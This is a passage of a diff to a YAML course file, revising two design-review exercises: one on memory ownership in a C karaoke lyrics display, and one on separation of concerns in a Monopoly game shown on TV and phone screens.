   # the rule to a chat server, covers L13 Make (a header missing from the
   # prerequisites), and spaces step 6 (rendering another user's text).
-  - title: "Review 9: Dorm-Lounge Karaoke Machine"
+  - title: "Review 9: Memory Ownership in C — Karaoke Lyrics"
     key: karaoke-lyrics-memory
-    estimated_minutes: 11
+    estimated_minutes: 9
     instructions: |
       ### Why this matters
 
-      Agents write C as readily as Python, and in C the most dangerous decisions span several modules, where no single function looks wrong. Following one piece of data through a sequence diagram is how a reviewer catches them.
+      C has no garbage collector: each block a program allocates must be freed exactly once, after its last use.
 
       ### 🎯 You will learn to
 
-      - Analyze a sequence diagram by tracing one piece of data through every message that uses it.
-      - Evaluate a low-level C design against what the user sees in a concrete scenario.
+      - Apply memory ownership to a sequence diagram of a C program by tracing one pointer through every message that uses it.
 
-      Someone in your dorm asked an agent to write the lyrics display of the lounge's karaoke machine in C. Review the design before it becomes code.
+      **Review question:** who frees this memory, and does anyone still use it after that?
     design_review:
       min_words: 30
       request: |
-        "Write the lyrics part of our dorm-lounge karaoke machine in C. It reads `.lrc` files (lyrics with timestamps). Show me a sequence diagram of one song before you write code."
+        "Write the lyrics display of our dorm-lounge karaoke machine in C. It reads `.lrc` files (lyrics with timestamps). Show me a sequence diagram of one song first."
       story: |
-        **As a** karaoke singer, **I want** each lyric line highlighted right on the beat, **so that** I can sing along.
+        **As a** karaoke singer, **I want** each lyric line highlighted on the beat, **so that** I can sing along.
       acceptance_criteria:
-        - "**Given** a song with an `.lrc` lyrics file, **when** it plays from start to end, **then** every line shows on time."
+        - "**Given** a song with an `.lrc` file, **when** it plays from start to end, **then** every line shows on time."
         - "**Given** a song just ended, **when** the next song starts, **then** the machine keeps running."
       reply: |
-        Here is one song, from parsing to the next song:
-
-        - **Parse once, cache by song:** `LrcParser` reads the `.lrc` file once, and `LyricsCache` keeps the lines for replays.
-        - **No copying:** `cache_put` stores the parser's pointer, so a 300-line song costs no extra time or memory.
+        - **Parse once, cache by song:** `LrcParser` reads the file once, and `LyricsCache` keeps the lines for replays.
+        - **No copying:** `cache_put` stores the parser's pointer, so a 300-line song costs no extra memory.
         - **Tidy memory:** the parser frees what it allocates, and `cache_clear()` frees every cached song between songs, so nothing leaks.
-        - **Error codes:** C has no exceptions, so every function returns 0 or -1.
-
-        Should I write `lrc.c` and `cache.c` next?
       given: |
-        Someone starts *Mr. Brightside*. Before each line, `LyricsView` asks the cache for the lyrics, and when the song ends, the next one starts. What does the singer see during the song, and what happens before the next one?
+        Someone starts *Mr. Brightside*. Before each line, `LyricsView` asks the cache for the lyrics; when the song ends, the next one starts. What does the singer see, and what happens before the next song?
+      task: |
+        Write the flaw, what goes wrong in the Given, and a fix that removes the cause. Explain the flaw in terms of **ownership**.
       diagrams:
         - id: karaoke-song
           type: sequence
@@ -2441,41 +2403,37 @@ steps:
   # Observer). The knowledge check spaces step 3 (a spy observer as the test
   # double) and step 1 (change impact), transfers to a music app, and reaches
   # L16 (semantic dependency) and L15 (shared data semantics).
-  - title: "Review 10: Bruin Monopoly on the Lounge TV"
+  - title: "Review 10: Separation of Concerns — Monopoly Screens"
     key: bruin-monopoly-views
-    estimated_minutes: 12
+    estimated_minutes: 10
     instructions: |
       ### Why this matters
 
-      An agent will happily hand you several diagrams of one design, and each view answers different questions. Choosing the view that answers your question is the first move of every review, and it decides whether you see a problem at all.
+      Separating the domain logic from the user interface lets a team add a screen, or test the rules, without touching the rules.
 
       ### 🎯 You will learn to
 
-      - Select the view (class or sequence diagram) that answers a design question.
-      - Evaluate a design shown in two views against its acceptance criteria, without sentence starters.
+      - Apply separation of concerns to a design shown in two views, and pick the view that shows the problem.
 
-      This is the last review, so the coaching is shorter: two hints per part instead of three.
+      **Review question:** could this rule run with no UI at all?
+
     design_review:
       min_words: 30
       request: |
-        "We're building Bruin Monopoly for the lounge: the board on the big TV, each player's balance on their own phone. Before you code, show me a class diagram and the sequence for paying rent."
+        "Build Bruin Monopoly for the lounge: the board on the TV, each balance on its player's phone. Show me a class diagram and the sequence for paying rent first."
       story: |
-        **As a** player, **I want** the board on the lounge TV and my balance on my phone to update the moment someone pays rent, **so that** everyone sees the same game.
+        **As a** player, **I want** the TV and my phone to update the moment someone pays rent, **so that** everyone sees the same game.
       acceptance_criteria:
         - "**Given** a game on the TV and three phones, **when** a player pays rent, **then** all four screens show the new balances within 1 s."
-        - "**Given** we add a new kind of screen later, **when** it joins a game, **then** no game rule has to change."
+        - "**Given** a new kind of screen, **when** it joins a game, **then** no game rule has to change."
       reply: |
-        Here is the design, in two views:
-
-        - **Class diagram:** every rule (rent, turns, buying) lives in `Game`, so the TV and the phones can never disagree about the rules.
-        - **Sequence diagram:** `payRent()` updates the balances and then redraws the TV and every phone in the same call, well within 1 s.
-        - **React on every screen:** `TvBoardView` and `PhoneView` are React components, so the club needs only one UI framework.
-
-        Shall I start with `Game` and its tests?
+        - **Class diagram:** every rule (rent, turns, buying) lives in `Game`, so the screens can never disagree about the rules.
+        - **Sequence diagram:** `payRent()` updates the balances, then redraws the TV and every phone in the same call, well within 1 s.
+        - **React on every screen**, so the club needs only one UI framework.
       given: |
-        The club wants two more screens: a spectator view on a second lounge TV, and a text UI that runs the game rules in automated tests. Trace what has to change to add each one.
+        The club wants two more screens: a spectator view on a second TV, and a text UI that runs the game rules in automated tests. What has to change to add each one?
       task: |
-        Two views this time, in two tabs of the Diagram pane. **First decide which view shows the problem**, and name that view in your comment. Then write the flaw, what goes wrong in the Given scenario, and a fix that removes the cause.
+        Two views, in two tabs: **first decide which view shows the problem** and name it in your comment. Then write the flaw, what goes wrong in the Given, and a fix, in terms of **separation of concerns**.
       diagrams:
         - id: monopoly-classes
           type: class
